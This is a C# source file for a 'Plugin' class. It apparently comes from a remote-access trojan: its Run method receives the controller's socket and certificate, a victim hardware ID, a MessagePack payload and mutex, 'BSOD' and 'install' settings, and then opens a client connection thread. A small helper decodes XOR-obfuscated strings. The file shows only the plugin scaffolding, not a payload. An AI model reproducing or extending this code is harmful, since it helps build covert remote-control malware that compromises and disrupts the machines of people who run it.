namespace Plugin
{
    using System.Diagnostics;
    using System.Net.Sockets;
    using System.Security.Cryptography.X509Certificates;
    using System.Text;
    using System.Threading;

    /// <summary>
    /// Defines the <see cref="Plugin" />.
    /// </summary>
    public class Plugin
    {
        /// <summary>
        /// Defines the Socket.
        /// </summary>
        public static Socket Socket;

        /// <summary>
        /// Defines the AppMutex.
        /// </summary>
        public static Mutex AppMutex;

        /// <summary>
        /// Defines the Mutex.
        /// </summary>
        public static string Mutex;

        /// <summary>
        /// Defines the BSOD.
        /// </summary>
        public static string BSOD;

        /// <summary>
        /// Defines the Install.
        /// </summary>
        public static string Install;

        /// <summary>
        /// Defines the InstallFile.
        /// </summary>
        public static string InstallFile;

        /// <summary>
        /// The Run.
        /// </summary>
        /// <param name="socket">The socket<see cref="Socket"/>.</param>
        /// <param name="certificate">The certificate<see cref="X509Certificate2"/>.</param>
        /// <param name="hwid">The hwid<see cref="string"/>.</param>
        /// <param name="msgPack">The msgPack<see cref="byte[]"/>.</param>
        /// <param name="mutex">The mutex<see cref="Mutex"/>.</param>
        /// <param name="mtx">The mtx<see cref="string"/>.</param>
        /// <param name="bsod">The bsod<see cref="string"/>.</param>
        /// <param name="install">The install<see cref="string"/>.</param>
        public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bsod, string install)
        {


            Debug.WriteLine("Plugin Invoked");
            AppMutex = mutex;
            Mutex = mtx;
            BSOD = bsod;
            Install = install;
            Socket = socket;
            Connection.ServerCertificate = certificate;
            Connection.Hwid = hwid;
            new Thread(() =>
            {
                Connection.InitializeClient(msgPack);
            }).Start();

            while (Connection.IsConnected)
            {
                Thread.Sleep(1000);
            }

        }

        /// <summary>
        /// The reupload.
        /// </summary>
        /// <param name="str">The str<see cref="string"/>.</param>
        /// <returns>The <see cref="string"/>.</returns>
        private static string reupload(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
    }
}
